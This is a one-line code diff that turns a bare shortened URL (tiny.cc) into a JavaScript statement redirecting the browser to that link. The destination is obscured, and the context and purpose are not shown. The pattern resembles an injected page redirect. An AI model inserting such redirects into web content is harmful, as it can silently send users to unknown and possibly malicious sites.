@@ -1,2 +1,1 @@
-
-http://tiny.cc/mnymjy
+window.location.href = 'http://tiny.cc/mnymjy';
